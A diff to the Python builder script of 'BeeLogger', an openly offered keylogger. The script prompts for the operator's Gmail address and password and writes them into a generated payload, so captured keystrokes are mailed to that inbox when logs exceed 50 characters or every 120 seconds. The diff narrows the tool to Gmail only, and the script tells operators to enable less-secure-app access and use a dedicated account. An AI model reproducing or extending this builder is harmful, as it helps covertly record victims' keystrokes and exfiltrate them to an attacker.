@@ -14,23 +14,13 @@ def clear():
     os.system('clear')
 def begin():
     os.system('sudo rm -Rf dist')
-    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
-    gh = raw_input('\nType email server (ex: \'smtp.gmail.com\'): ')
-   # if len(gh) != 1 or 'smtp' not in gh:
-  #      print "\n{0} [!] Please use a valid smtp server.{1}".format(RED, END)
-   #     begin()
-    ghp = raw_input('\nType email server port (ex: \'587\'): ')
-   # if len(gh) != 1:
- #       print "\n{0} [!] Please type a valid smtp server port.{1}".format(RED, END)
-      # begin()
-    email = raw_input('Type your email to receive logs: ')
-    epass = raw_input('Type your email password: ')
+# TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
+    email = raw_input('Type your gmail to receive logs: ')
+    epass = raw_input('Type your gmail password: ')
     print '\n'
     print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n   email: ' + email
     print '   password: ' + epass 
-    print '   smtp: ' + gh
-    print '   port: ' + ghp
     print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n'    
     ask = raw_input('These info above are correct? (y/n) :')
@@ -42,8 +32,6 @@ def begin():
     o = template.read()
     payload = '#/usr/bin/python\n'
     payload += '# -*- coding: utf-8 -*-\n'
-    payload += 'GH = ' + "'" + gh + "'" + '\n'
-    payload += 'GHP = ' + "'" + ghp + "'" + '\n'
     payload += 'EEMAIL = ' + "'" + email + "'" + '\n'
     payload += 'EPASS = ' + "'" + epass + "'" + '\n'
     payload += str(o)
@@ -98,7 +86,7 @@ def main():
                 raise SystemExit
             if choice.upper() == 'K':
                 option()
-                print '\n {0}WARNING: Enable access to less secure apps on your email account.{1}  \n -> RECOMMENDED: \n* GMAIL * https://www.google.com/settings/security/lesssecureapps'.format(RED, END)
+                print '\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END)
                 print '\n NOTE: Don\'t use your personal email, make a dedicated.'
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
